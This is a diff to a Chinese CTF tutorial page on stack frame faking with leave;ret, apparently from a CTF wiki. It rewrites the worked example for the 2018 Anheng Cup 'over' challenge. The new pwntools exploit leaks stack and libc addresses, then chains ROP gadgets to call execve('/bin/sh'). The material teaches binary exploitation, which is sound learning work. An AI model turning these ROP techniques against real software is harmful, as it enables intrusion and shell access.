@@ -161,7 +161,7 @@ sh.interactive()
 buffer padding|fake ebp|leave ret addr|
 ```
 
-即我们利用栈溢出将栈上构造为如上格式。这里我们主要接下后面两个部分
+即我们利用栈溢出将栈上构造为如上格式。这里我们主要讲下后面两个部分
 
 - 函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。
 - 其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下
@@ -236,7 +236,7 @@ ebp2|leave ret addr|arg1|arg2
 可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似。
 
 
-### 2018 6月 安恒杯 over
+### 例子
 以 2018 年 6 月安恒杯月赛的 over 一题为例进行介绍, 题目可以在 ctf-challenge 中找到
 
 #### 文件信息
@@ -334,57 +334,44 @@ pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160
 0x7ffceaf111d0->0x7ffceaf11160 is -0x70 bytes (-0xe words)
 ```
 
-leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址(如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了, 比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 sub\_
-400676 函数来 leak libc, 然后在下一次利用时就可以通过 rop 执行 system("/bin/sh") 来 get shell 了, 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过多次调试来确定
+leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址(如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了, 比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 sub\_400676 函数来 leak libc, 然后在下一次利用时就可以通过 rop 执行 system("/bin/sh") 或 execve("/bin/sh", 0, 0)来 get shell 了, 这道题目因为输入的长度足够, 我们可以布置调用 execve("/bin/sh", 0, 0) 的利用链, 这种方法更稳妥(system("/bin/sh") 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过多次调试来确定
 
 #### exp
 ```python
-others_over [master●●] cat solve.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
 from pwn import *
-context.log_level = "debug"
 context.binary = "./over.over"
-context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 def DEBUG(cmd):
     raw_input("DEBUG: ")
     gdb.attach(io, cmd)
 
-
 io = process("./over.over")
-#  DEBUG("b *0x4006B9\nc")
 elf = ELF("./over.over")
 libc = elf.libc
 
-io.sendafter(">", '0' * 80)
+io.sendafter(">", 'a' * 80)
 stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70
 success("stack -> {:#x}".format(stack))
-'''
-others_over [master●●] ropper --file ./over.over --search "leave|ret"
-[INFO] Load gadgets from cache
-[LOAD] loading... 100%
-[LOAD] removing double gadgets... 100%
-[INFO] Searching for gadgets: leave|ret
 
-[INFO] File: ./over.over
-0x00000000004007d0: ret 0xfffe; 
-0x00000000004006be: leave; ret; 
-0x0000000000400509: ret; 
-
-0x0000000000400793 : pop rdi ; ret
-'''
 
 #  DEBUG("b *0x4006B9\nc")
 io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
 libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
 success("libc.address -> {:#x}".format(libc.address))
 
-io.sendafter(">", flat(['22222222', 0x400793, next(libc.search("/bin/sh")), libc.sym['system'], (80 - 40 + 8) * '2', stack - 0x30, 0x4006be]))
+pop_rdi_ret=0x400793
+'''
+$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
+0x00000000000f5279 : pop rdx ; pop rsi ; ret
+'''
+pop_rdx_pop_rsi_ret=libc.address+0xf5279
+
+
+payload=flat(['22222222', pop_rdi_ret, next(libc.search("/bin/sh")),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym['execve'], (80 - 7*8 ) * '2', stack - 0x30, 0x4006be])
+
+io.sendafter(">", payload)
 
 io.interactive()
-io.close()
 ```
 
 总的来说这种方法跟 stack pivot 差别并不是很大
@@ -399,7 +386,7 @@ io.close()
 ### 原理
 
 
-在程序加了canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序发现 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 __stack_chk_fail 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下
+在程序加了canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 __stack_chk_fail 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下
 
 ```C
 void __attribute__ ((noreturn)) __stack_chk_fail (void)
